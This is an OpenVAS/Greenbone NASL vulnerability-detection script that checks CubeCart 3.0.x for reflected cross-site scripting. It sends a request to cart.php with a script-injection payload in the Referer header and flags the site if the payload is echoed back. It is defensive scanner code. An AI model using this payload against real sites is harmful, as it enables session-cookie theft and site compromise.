# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cubecart:cubecart";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803090");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-12-25 15:26:41 +0530 (Tue, 25 Dec 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("CubeCart Multiple Vulnerabilities");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_cubecart_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cubecart/installed");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2012/Dec/128");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57031");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/119041");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Dec/233");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Dec/234");
  script_xref(name:"URL", value:"http://www.cubecart.com");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  site and manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"CubeCart version 3.0.x through 3.0.20.");

  script_tag(name:"insight", value:"Inputs passed via multiple parameters to 'index.php', 'cart.php' and Admin
  Interface is not properly sanitised before it is returned to the user.");

  script_tag(name:"solution", value:"Upgrade to CubeCart version 5.0 or later.");

  script_tag(name:"summary", value:"CubeCart is prone to multiple vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

useragent = http_get_user_agent();
host = http_host_name( port:port );

url = dir + '/cart.php?act=cart';
req = string( 'GET ', url, ' HTTP/1.1\r\n',
              'Host: ', host, '\r\n',
              'User-Agent: ', useragent, '\r\n',
              'Referer: "/><script>alert(document.cookie)</script>\r\n\r\n' );
res = http_keepalive_send_recv( port:port, data:req );

if( res && res =~ "^HTTP/1\.[01] 200" &&
    "Powered by CubeCart" >< res && "Devellion Limited" >< res &&
    "><script>alert(document.cookie)</script>" >< res ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit(0);
}

exit(99);
